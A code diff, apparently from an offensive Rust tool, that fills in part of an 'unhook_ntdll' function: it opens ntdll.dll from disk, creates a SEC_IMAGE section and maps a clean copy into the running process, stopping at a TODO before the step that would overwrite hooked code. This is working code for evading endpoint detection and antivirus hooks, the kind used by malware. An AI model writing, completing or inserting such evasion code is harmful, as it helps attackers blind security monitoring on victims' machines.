@@ -101,6 +101,49 @@ pub unsafe fn unhook_ntdll() -> Option<usize> {
     let file_handle = open_ntdll_file()?;
     debug!("[UNHOOK] Opened ntdll.dll from disk");
 
-    // TODO: Create a SEC_IMAGE section
+    // Create a SEC_IMAGE section
+    let mut section_handle: HANDLE = null_mut();
+    let status = nt::nt_create_section(
+        &mut section_handle,
+        0x000F0005, // SECTION_MAP_READ | SECTION_QUERY | STANDARD_RIGHTS_REQUIRED
+        null_mut(), // no ObjectAttributes
+        null_mut(), // MaximumSize = file size
+        0x02,       // PAGE_READONLY
+        0x01000000, // SEC_IMAGE, map as PE image
+        file_handle,
+    );
+    nt::nt_close(file_handle);
+
+    if status != STATUS_SUCCESS || section_handle.is_null() {
+        debug!("[UNHOOK] NtCreateSeection failed: 0x{:08X}", status);
+        return None;
+    }
+
+    // Map the clean ntdll image into our process
+    let mut clean_base: *mut c_void = null_mut();
+    let mut view_size: usize = 0;
+    let current_process: HANDLE = -1isize as HANDLE;
+
+    let status = nt::nt_map_view_of_section(
+        section_handle,
+        current_process,
+        &mut clean_base,
+        0,          // ZeroBits
+        0,          // CommitSize
+        null_mut(), // SectionOffset
+        &mut view_size,
+        2,          // ViewUnmap
+        0,          // AllocationType
+        0x02,       // PAGE_READONLY    
+    );
+    nt::nt_close(section_handle);
+
+    if status != STATUS_SUCCESS || clean_base.is_null() {
+        debug!("[UNHOOK] NtMapViewOfSection failed: 0x{:08X}", status);
+        return None;
+    }
+    debug!("[UNHOOK] Clean ntdll mapped at: {:p} size=0x{:X}", clean_base, view_size);
+
+    // TODO: Find .txt section in both images
     unimplemented!()
 }
